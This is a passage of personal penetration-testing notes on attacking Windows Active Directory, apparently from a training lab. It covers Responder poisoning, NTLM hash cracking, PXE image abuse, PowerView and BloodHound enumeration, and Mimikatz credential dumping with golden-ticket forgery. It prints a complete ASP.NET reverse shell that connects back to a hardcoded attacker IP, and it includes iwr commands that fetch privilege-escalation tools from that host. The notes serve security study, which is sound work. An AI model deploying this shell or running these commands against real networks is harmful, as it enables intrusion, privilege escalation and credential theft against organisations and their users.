      sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart

- Verify the credentials settings with

      ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms

![image](https://github.com/user-attachments/assets/2d76c37b-99d3-4c62-80b0-f98834e167f3)

- Now, use `tcpdump` to  sniff packets

![image](https://github.com/user-attachments/assets/a2b0fb03-ce71-457c-8140-22a5b489e59e)

![image](https://github.com/user-attachments/assets/f904eee5-b731-4bb1-a108-e3d31d78258f)


### AUTHENTICATION RELAYS

### NETNTLM AUTHENTICATION OVER SMB

- Server Messsage Block allow users to communicate with a server via file shares.In networks that use Microsoft AD, SMB governs everything from inter-network file-sharing to remote administration. Even the "out of paper" alert your computer receives when you try to print a document is the work of the SMB protocol.
- However, the security of earlier versions of the SMB protocol was deemed insufficient. Several vulnerabilities and exploits were discovered that could be leveraged to recover credentials or even gain code execution on devices. Although some of these vulnerabilities were resolved in newer versions of the protocol, often organisations do not enforce the use of more recent versions since legacy systems do not support them. We will be looking at two different exploits for NetNTLM authentication with SMB:

  -  Since the NTLM Challenges can be intercepted, we can use offline cracking techniques to recover the password associated with the NTLM Challenge. However, this cracking process is significantly slower than cracking NTLM hashes directly.
  - We can use our rogue device to stage a man in the middle attack, relaying the SMB authentication between the client and server, which will provide us with an active authenticated session and access to the target server.

### Using Responder to poison  Link-Local Multicast Name Resolution (LLMNR),  NetBIOS Name Service (NBT-NS), and Web Proxy Auto-Discovery (WPAD) requests that are detected

- Responder allows us to perform Man-in-the-Middle attacks by poisoning the responses during NetNTLM authentication, tricking the client into talking to you instead of the actual server they wanted to connect to.On a real LAN, Responder will attempt to poison any  Link-Local Multicast Name Resolution (LLMNR),  NetBIOS Name Service (NBT-NS), and Web Proxy Auto-Discovery (WPAD) requests that are detected. On large Windows networks, these protocols allow hosts to perform their own local DNS resolution for all hosts on the same local network. Rather than overburdening network resources such as the DNS servers, hosts can first attempt to determine if the host they are looking for is on the same local network by sending out LLMNR requests and seeing if any hosts respond. However, Responder will actively listen to the requests and send poisoned responses telling the requesting host that our IP is associated with the requested hostname. By poisoning these requests, Responder attempts to force the client to connect to our AttackBox. In the same line, it starts to host several servers such as SMB, HTTP, SQL, and others to capture these requests and force authentication.

- Using responder requires syntax `sudo responder -i <interface>

![image](https://github.com/user-attachments/assets/edbdcdfd-1a24-428c-af2f-8f34572cefdc)

- If the responder triggers any error,try to stop the service running on that port

![image](https://github.com/user-attachments/assets/36be688c-7b4b-4425-bddb-8f5b58327510)

- Use one liner `ss --udp --tcp --listen --process` to spot ports running

![image](https://github.com/user-attachments/assets/21ff839b-a6f9-4b6f-b51e-128b267be9ea)

- Use hashcat to crack the NTLM hash or john

`hashcat -m 5600 <hash file> <password file> --force`

![image](https://github.com/user-attachments/assets/258289b9-b6c4-46a9-a8ca-2da81d15c0ed)


### MICROSOFT DEVELOPMENT TOOLKITS

- Large organisations need tools to deploy and manage the infrastructure of the estate. In massive organisations, you can't have your IT personnel using DVDs or even USB Flash drives running around installing software on every single machine. Luckily, Microsoft already provides the tools required to manage the estate. However, we can exploit misconfigurations in these tools to also breach AD.

### PXE BOOT

- Organizations use PXE boot to allow new devices that are connected to the network to load and install the OS directly over a network connection. MDT can be used to create, manage, and host PXE boot images. PXE boot is usually integrated with DHCP, which means that if DHCP assigns an IP lease, the host is allowed to request the PXE boot image and start the network OS installation process. The communication flow is shown in the diagram below:

![image](https://github.com/user-attachments/assets/5c82863a-3ffb-4d5c-99e4-8e7454f54769)

- The boot image can be received over tftp
- Once the process is performed, the client will use a TFTP connection to download the PXE boot image. We can exploit the PXE boot image for two different purposes:

    - Inject a privilege escalation vector, such as a Local Administrator account, to gain Administrative access to the OS once the PXE boot has been completed.
    - Perform password scraping attacks to recover AD credentials used during the install.

### Credentials in Configuration files

- The target in this scenario is a Mcafee's database

![image](https://github.com/user-attachments/assets/86b81975-8f82-4318-bc75-2399d82eeb75)

- Copy to your host machine with scp `secure copy`

  `scp <user>@<host>:<c:\<file>> `

- Using sqlite3 to check user values, use `.open <db_name>` to open a db

![image](https://github.com/user-attachments/assets/10ee983e-2e90-4dfb-9df5-e1eaaf7ecfa9)

- Crack the encrypted password string with this [tool](https://github.com/funoverip/mcafee-sitelist-pwd-decryption)

Usage-:```python mcafee_sitelist_pwd_decrypt.py <string>```

![image](https://github.com/user-attachments/assets/4b4f732e-4862-4678-915e-c1bc0ae2e58b)

-------------

### SYSINTERNAL utilties

-------------

- Sysinternal troubleshooting utilities
- [Link](https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)

-------------

###  Fixing Get-AppxPackage not installed Error

------------

- You have to import first with this command in an Admistrator prompt [`powershell start pwsh -v runAs`]

```powershell
 Import-Module Appx -UseWinPS
```

------------

### Reference

--------------

- [Stack Overflow](https://superuser.com/questions/1456837/powershell-get-appxpackage-not-working)

---------------

### Copying files with powershell `iwr`

----------------

- Powershell `iwr`

```pwsh
iwr -uri http://x.x.x.x/winpeas.exe -Outfile winpeas.exe
```
---------------

### Service Binary Hijacking

----------------

-----------------

### Asp Reverse shell

-----------------

- Example-:

```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Security.Principal" %>
<%@ Import Namespace="System.Data.SqlClient" %>
<script runat="server">
//Original shell post: https://www.darknet.org.uk/2014/12/insomniashell-asp-net-reverse-shell-bind-shell/
//Download link: https://www.darknet.org.uk/content/files/InsomniaShell.zip
    
        protected void Page_Load(object sender, EventArgs e)
    {
            String host = "10.8.36.31"; //CHANGE THIS
            int port = 80; ////CHANGE THIS
                
        CallbackShell(host, port);
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO
    {
        public int cb;
        public String lpReserved;
        public String lpDesktop;
        public String lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SECURITY_ATTRIBUTES
    {
        public int Length;
        public IntPtr lpSecurityDescriptor;
        public bool bInheritHandle;
    }
    
    
    [DllImport("kernel32.dll")]
    static extern bool CreateProcess(string lpApplicationName,
       string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes,
       ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles,
       uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
       [In] ref STARTUPINFO lpStartupInfo,
       out PROCESS_INFORMATION lpProcessInformation);

    public static uint INFINITE = 0xFFFFFFFF;
    
    [DllImport("kernel32", SetLastError = true, ExactSpelling = true)]
    internal static extern Int32 WaitForSingleObject(IntPtr handle, Int32 milliseconds);

    internal struct sockaddr_in
    {
        public short sin_family;
        public short sin_port;
        public int sin_addr;
        public long sin_zero;
    }

    [DllImport("kernel32.dll")]
    static extern IntPtr GetStdHandle(int nStdHandle);

    [DllImport("kernel32.dll")]
    static extern bool SetStdHandle(int nStdHandle, IntPtr hHandle);

    public const int STD_INPUT_HANDLE = -10;
    public const int STD_OUTPUT_HANDLE = -11;
    public const int STD_ERROR_HANDLE = -12;
    
    [DllImport("kernel32")]
    static extern bool AllocConsole();


    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    internal static extern IntPtr WSASocket([In] AddressFamily addressFamily,
                                            [In] SocketType socketType,
                                            [In] ProtocolType protocolType,
                                            [In] IntPtr protocolInfo, 
                                            [In] uint group,
                                            [In] int flags
                                            );

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    internal static extern int inet_addr([In] string cp);
    [DllImport("ws2_32.dll")]
    private static extern string inet_ntoa(uint ip);

    [DllImport("ws2_32.dll")]
    private static extern uint htonl(uint ip);
    
    [DllImport("ws2_32.dll")]
    private static extern uint ntohl(uint ip);
    
    [DllImport("ws2_32.dll")]
    private static extern ushort htons(ushort ip);
    
    [DllImport("ws2_32.dll")]
    private static extern ushort ntohs(ushort ip);   

    
   [DllImport("WS2_32.dll", CharSet=CharSet.Ansi, SetLastError=true)]
   internal static extern int connect([In] IntPtr socketHandle,[In] ref sockaddr_in socketAddress,[In] int socketAddressSize);

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
   internal static extern int send(
                                [In] IntPtr socketHandle,
                                [In] byte[] pinnedBuffer,
                                [In] int len,
                                [In] SocketFlags socketFlags
                                );

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
   internal static extern int recv(
                                [In] IntPtr socketHandle,
                                [In] IntPtr pinnedBuffer,
                                [In] int len,
                                [In] SocketFlags socketFlags
                                );

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
   internal static extern int closesocket(
                                       [In] IntPtr socketHandle
                                       );

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
   internal static extern IntPtr accept(
                                  [In] IntPtr socketHandle,
                                  [In, Out] ref sockaddr_in socketAddress,
                                  [In, Out] ref int socketAddressSize
                                  );

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
   internal static extern int listen(
                                  [In] IntPtr socketHandle,
                                  [In] int backlog
                                  );

    [DllImport("WS2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
   internal static extern int bind(
                                [In] IntPtr socketHandle,
                                [In] ref sockaddr_in  socketAddress,
                                [In] int socketAddressSize
                                );


   public enum TOKEN_INFORMATION_CLASS
   {
       TokenUser = 1,
       TokenGroups,
       TokenPrivileges,
       TokenOwner,
       TokenPrimaryGroup,
       TokenDefaultDacl,
       TokenSource,
       TokenType,
       TokenImpersonationLevel,
       TokenStatistics,
       TokenRestrictedSids,
       TokenSessionId
   }

   [DllImport("advapi32", CharSet = CharSet.Auto)]
   public static extern bool GetTokenInformation(
       IntPtr hToken,
       TOKEN_INFORMATION_CLASS tokenInfoClass,
       IntPtr TokenInformation,
       int tokeInfoLength,
       ref int reqLength);

   public enum TOKEN_TYPE
   {
       TokenPrimary = 1,
       TokenImpersonation
   }

   public enum SECURITY_IMPERSONATION_LEVEL
   {
       SecurityAnonymous,
       SecurityIdentification,
       SecurityImpersonation,
       SecurityDelegation
   }

   
   [DllImport("advapi32.dll", EntryPoint = "CreateProcessAsUser", SetLastError = true, CharSet = CharSet.Ansi, CallingConvention = CallingConvention.StdCall)]
   public extern static bool CreateProcessAsUser(IntPtr hToken, String lpApplicationName, String lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes,
       ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandle, int dwCreationFlags, IntPtr lpEnvironment,
       String lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

   [DllImport("advapi32.dll", EntryPoint = "DuplicateTokenEx")]
   public extern static bool DuplicateTokenEx(IntPtr ExistingTokenHandle, uint dwDesiredAccess,
       ref SECURITY_ATTRIBUTES lpThreadAttributes, SECURITY_IMPERSONATION_LEVEL ImpersonationLeve, TOKEN_TYPE TokenType,
       ref IntPtr DuplicateTokenHandle);

   

   const int ERROR_NO_MORE_ITEMS = 259;

   [StructLayout(LayoutKind.Sequential)]
   struct TOKEN_USER
   {
       public _SID_AND_ATTRIBUTES User;
   }

   [StructLayout(LayoutKind.Sequential)]
   public struct _SID_AND_ATTRIBUTES
   {
       public IntPtr Sid;
       public int Attributes;
   }

   [DllImport("advapi32", CharSet = CharSet.Auto)]
   public extern static bool LookupAccountSid
   (
       [In, MarshalAs(UnmanagedType.LPTStr)] string lpSystemName,
       IntPtr pSid,
       StringBuilder Account,
       ref int cbName,
       StringBuilder DomainName,
       ref int cbDomainName,
       ref int peUse 

   );

   [DllImport("advapi32", CharSet = CharSet.Auto)]
   public extern static bool ConvertSidToStringSid(
       IntPtr pSID,
       [In, Out, MarshalAs(UnmanagedType.LPTStr)] ref string pStringSid);


   [DllImport("kernel32.dll", SetLastError = true)]
   public static extern bool CloseHandle(
       IntPtr hHandle);

   [DllImport("kernel32.dll", SetLastError = true)]
   public static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwProcessId);
   [Flags]
   public enum ProcessAccessFlags : uint
   {
       All = 0x001F0FFF,
       Terminate = 0x00000001,
       CreateThread = 0x00000002,
       VMOperation = 0x00000008,
       VMRead = 0x00000010,
       VMWrite = 0x00000020,
       DupHandle = 0x00000040,
       SetInformation = 0x00000200,
       QueryInformation = 0x00000400,
       Synchronize = 0x00100000
   }

   [DllImport("kernel32.dll")]
   static extern IntPtr GetCurrentProcess();

   [DllImport("kernel32.dll")]
   extern static IntPtr GetCurrentThread();


   [DllImport("kernel32.dll", SetLastError = true)]
   [return: MarshalAs(UnmanagedType.Bool)]
   static extern bool DuplicateHandle(IntPtr hSourceProcessHandle,
      IntPtr hSourceHandle, IntPtr hTargetProcessHandle, out IntPtr lpTargetHandle,
      uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwOptions);

    [DllImport("psapi.dll", SetLastError = true)]
    public static extern bool EnumProcessModules(IntPtr hProcess,
    [MarshalAs(UnmanagedType.LPArray, ArraySubType = UnmanagedType.U4)] [In][Out] uint[] lphModule,
    uint cb,
    [MarshalAs(UnmanagedType.U4)] out uint lpcbNeeded);

    [DllImport("psapi.dll")]
    static extern uint GetModuleBaseName(IntPtr hProcess, uint hModule, StringBuilder lpBaseName, uint nSize);

    public const uint PIPE_ACCESS_OUTBOUND = 0x00000002;
    public const uint PIPE_ACCESS_DUPLEX = 0x00000003;
    public const uint PIPE_ACCESS_INBOUND = 0x00000001;
    public const uint PIPE_WAIT = 0x00000000;
    public const uint PIPE_NOWAIT = 0x00000001;
    public const uint PIPE_READMODE_BYTE = 0x00000000;
    public const uint PIPE_READMODE_MESSAGE = 0x00000002;
    public const uint PIPE_TYPE_BYTE = 0x00000000;
    public const uint PIPE_TYPE_MESSAGE = 0x00000004;
    public const uint PIPE_CLIENT_END = 0x00000000;
    public const uint PIPE_SERVER_END = 0x00000001;
    public const uint PIPE_UNLIMITED_INSTANCES = 255;

    public const uint NMPWAIT_WAIT_FOREVER = 0xffffffff;
    public const uint NMPWAIT_NOWAIT = 0x00000001;
    public const uint NMPWAIT_USE_DEFAULT_WAIT = 0x00000000;

    public const uint GENERIC_READ = (0x80000000);
    public const uint GENERIC_WRITE = (0x40000000);
    public const uint GENERIC_EXECUTE = (0x20000000);
    public const uint GENERIC_ALL = (0x10000000);

    public const uint CREATE_NEW = 1;
    public const uint CREATE_ALWAYS = 2;
    public const uint OPEN_EXISTING = 3;
    public const uint OPEN_ALWAYS = 4;
    public const uint TRUNCATE_EXISTING = 5;

    public const int INVALID_HANDLE_VALUE = -1;

    public const ulong ERROR_SUCCESS = 0;
    public const ulong ERROR_CANNOT_CONNECT_TO_PIPE = 2;
    public const ulong ERROR_PIPE_BUSY = 231;
    public const ulong ERROR_NO_DATA = 232;
    public const ulong ERROR_PIPE_NOT_CONNECTED = 233;
    public const ulong ERROR_MORE_DATA = 234;
    public const ulong ERROR_PIPE_CONNECTED = 535;
    public const ulong ERROR_PIPE_LISTENING = 536;

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateNamedPipe(
        String lpName,
        uint dwOpenMode,
        uint dwPipeMode,
        uint nMaxInstances,
        uint nOutBufferSize,
        uint nInBufferSize,
        uint nDefaultTimeOut,
        IntPtr pipeSecurityDescriptor
        );

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool ConnectNamedPipe(
        IntPtr hHandle,
        uint lpOverlapped
        );

    [DllImport("Advapi32.dll", SetLastError = true)]
    public static extern bool ImpersonateNamedPipeClient(
        IntPtr hHandle);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool GetNamedPipeHandleState(
        IntPtr hHandle,
        IntPtr lpState,
        IntPtr lpCurInstances,
        IntPtr lpMaxCollectionCount,
        IntPtr lpCollectDataTimeout,
        StringBuilder lpUserName,
        int nMaxUserNameSize
        );
 
    protected void CallbackShell(string server, int port)
    {

        string request = "Spawn Shell...\n";
        Byte[] bytesSent = Encoding.ASCII.GetBytes(request);

        IntPtr oursocket = IntPtr.Zero;
        
        sockaddr_in socketinfo;
        oursocket = WSASocket(AddressFamily.InterNetwork,SocketType.Stream,ProtocolType.IP, IntPtr.Zero, 0, 0);
        socketinfo = new sockaddr_in();
        socketinfo.sin_family = (short) AddressFamily.InterNetwork;
        socketinfo.sin_addr = inet_addr(server);
        socketinfo.sin_port = (short) htons((ushort)port);
        connect(oursocket, ref socketinfo, Marshal.SizeOf(socketinfo));
        send(oursocket, bytesSent, request.Length, 0);
        SpawnProcessAsPriv(oursocket);
        closesocket(oursocket);
    }

    protected void SpawnProcess(IntPtr oursocket)
    {
        bool retValue;
        string Application = Environment.GetEnvironmentVariable("comspec"); 
        PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
        STARTUPINFO sInfo = new STARTUPINFO();
        SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
        pSec.Length = Marshal.SizeOf(pSec);
        sInfo.dwFlags = 0x00000101;
        sInfo.hStdInput = oursocket;
        sInfo.hStdOutput = oursocket;
        sInfo.hStdError = oursocket;
        retValue = CreateProcess(Application, "", ref pSec, ref pSec, true, 0, IntPtr.Zero, null, ref sInfo, out pInfo);
        WaitForSingleObject(pInfo.hProcess, (int)INFINITE);
    }

    protected void SpawnProcessAsPriv(IntPtr oursocket)
    {
        bool retValue;
        string Application = Environment.GetEnvironmentVariable("comspec"); 
        PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
        STARTUPINFO sInfo = new STARTUPINFO();
        SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
        pSec.Length = Marshal.SizeOf(pSec);
        sInfo.dwFlags = 0x00000101; 
        IntPtr DupeToken = new IntPtr(0);
        sInfo.hStdInput = oursocket;
        sInfo.hStdOutput = oursocket;
        sInfo.hStdError = oursocket;
        if (DupeToken == IntPtr.Zero)
            retValue = CreateProcess(Application, "", ref pSec, ref pSec, true, 0, IntPtr.Zero, null, ref sInfo, out pInfo);
        else
            retValue = CreateProcessAsUser(DupeToken, Application, "", ref pSec, ref pSec, true, 0, IntPtr.Zero, null, ref sInfo, out pInfo);
        WaitForSingleObject(pInfo.hProcess, (int)INFINITE);
        CloseHandle(DupeToken);
    }
    </script>
```

---------------

### Weirdstuff

---------------

- `Certutil` gets filtered by AV while `iwr` doesn't get bypassed.

```powershell
iwr http://10.8.36.31:8002/PrintSpoofer64.exe -Outfile C:\Users\Bob\Desktop\PrintSpoofer64.exe
```

---------------

### SEIMPERSONATE privilege exploitation with printspoofer

--------------

- An account that has the SeImpersonate privilege enabled has the ability to impersonate another client after authentication. This means that this privilege allows the account to impersonate other accounts, so long as they have authenticated. Whenever a user authenticates to a host, a token (logon sessions inside the LSASS process) resides on the system until the next restart.
 
- Exploit [link](https://github.com/itm4n/PrintSpoofer)-:

![image](https://github.com/user-attachments/assets/b395626c-692b-4164-8d29-5a96b42d3795)

-----------------

### Interactive shell with rlwrap

-----------------

- Use `sudo rlwrap -cAr nc -nlvp 1337`

![image](https://github.com/user-attachments/assets/eeeb1cc2-71ed-420e-9386-9007deaf600b)

------------------

### Post Exploitation

------------------- 

- Bypass powershell execution policy with-:

```powershell
powershell -ep bypass
```
- Start powerview with

```powershell
Import-Module .\PowerView.ps1
```

- Enumerate the domain user with-:

```powershell
Get-NetUser | select cn
```

![image](https://github.com/user-attachments/assets/59a719fa-b85f-47c0-80c5-2b9c9e18d4c0)

- Enumerate Domain groups

```powershell
Get-NetGroup -GroupName *admin*
```

![image](https://github.com/user-attachments/assets/2c352812-a69f-40d4-a196-66a482331f96)

- Enumerating more, use [cheatsheet](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993) and [here](https://www.hackingarticles.in/active-directory-enumeration-powerview/)

- Enumerating shares in AD-:

```
Invoke-ShareFinder
```

![image](https://github.com/user-attachments/assets/8efc7b0a-13b5-4dfe-acfe-0c4fc641a6c1)

- Enumerating the machines os on AD-:

```
Get-NetComputer -fulldata | select operatingsystem
```

---------------------

### Bloodhound

---------------------

- Bloodhound is a graphical interface that allows you to visually map out the network. This tool along with SharpHound which similar to PowerView takes the user, groups, trusts etc. of the network and collects them into .json files to be used inside of Bloodhound.
- Installing bloodhound-:

```bash
apt-get install bloodhound
neo4j console #- default credentials -> neo4j:neo4j
```
- Starting bloodhound, I suggest you run with the latest Bloodhound [scripts](https://github.com/SpecterOps/SharpHound/releases)

```
powershell -ep bypass
Import-Module .\SharpHound.ps1    
Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
```

![image](https://github.com/user-attachments/assets/964f266d-97b7-4154-a62d-c4200677c289)

- Copy to your machine
- Now, run `bloodhound`, creds is defualt-: `neo4j:neo4j`, the current bloodhound version requires you to change password of neo4j db.The highlighted part is the import part.

![image](https://github.com/user-attachments/assets/1cffa30d-7999-4544-b33a-3e380c9f928d)

- Drag and drop works too

![image](https://github.com/user-attachments/assets/2c882069-79c6-461e-a3ee-f7c613737d9d)

- Bloodhound post processing [error](https://github.com/SpecterOps/BloodHound-Legacy/issues/724) fix.Try to delete the `computers.json` file before uploading the `loot.zip` Check analysis for queries to try-:

![image](https://github.com/user-attachments/assets/c0e7f122-fce4-42cc-91ff-b788418864eb)

------------------

### SMB1 ERROR while receiving files

------------------

- Error-:

![image](https://github.com/user-attachments/assets/5df19ea4-5a0f-46fe-bcf5-851797a90fec)

- Ensure smb2support is specified

```
python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali . -smb2support
```

![image](https://github.com/user-attachments/assets/f3dfc4e8-af42-4883-8522-b5796938193e)

----------------------

### Error-:  You can't access this shared folder because your organization's security policies block unauthenticated guest access.These policies help protect your PC from unsafe or malicious devices on the network

---------------------

- Error-:

![image](https://github.com/user-attachments/assets/282a9336-1e54-42e8-ae2e-00ee8a173369)


- [Fix](https://vtechnologies.my.site.com/support/s/article/You-can-t-access-this-shared-folder-because-your-organization-s-security-policies-block-unauthenticated-guest-access)-:

![image](https://github.com/user-attachments/assets/6b9e1c0a-8b0a-4180-ae82-c850bfd79ee2)

- Solved-:

![image](https://github.com/user-attachments/assets/42516a6b-25f3-46d2-a5ea-93e7edf4bc00)

-----------------------

### Mimikatz

----------------------

- Mimikatz is a very popular and powerful post-exploitation tool mainly used for dumping user credentials inside of a active directory network.
- Run the mimikatz binary with-:

```powershell
.\mimikatz.exe
```

- `privilege::debug`-:This ensures that you're running mimikatz as an administrator; if you don't run mimikatz as an administrator, mimikatz will not run properly.It should be `200: ok`.

![image](https://github.com/user-attachments/assets/54896a79-623a-4951-a043-9df9a4f75929)

- Dump hashes with-:

```powershell
lsadump::lsa /patch
```

![image](https://github.com/user-attachments/assets/dff6ac18-1a61-4368-825f-df5457485be1)

- Crack with hashcat-:

```bash
hashcat -m 1000 <hash> rockyou.txt
```

---------------------

### Golden Ticket

----------------------

- This attack dump the hash and sid of the krbtgt user. then create a golden ticket and use that golden ticket to open up a new command prompt allowing us to access any machine on the network.
- Dumping the hash of the user `Kerberos Ticket Granting Ticket` account, this dumps the hash and security identifier of the Kerberos Ticket Granting Ticket account allowing you to create a golden ticket.

```mimikatz
lsadump::lsa /inject /name:krbtgt
```
![image](https://github.com/user-attachments/assets/5e75de95-d792-4015-8d2e-8e70cf3fdd24)

- Create a golden ticket with-:

```mimikatz
kerberos::golden /user: /domain: /sid: /krbtgt: /id:
```

- Use `misc::cmd` to spawn an elevated shell-:

![image](https://github.com/user-attachments/assets/80c18837-d239-477f-a320-232e50afab7a)

---------------

### RDP Timeout error in xfreerdp

---------------

- Error-:

![image](https://github.com/user-attachments/assets/2950dcad-92bf-419f-a14a-c2c54d633689)

- Increase the timeout-: `/timeout:60000`

![image](https://github.com/user-attachments/assets/46c5b7c6-883a-432e-9e91-677b9c1187a5)

-----------------




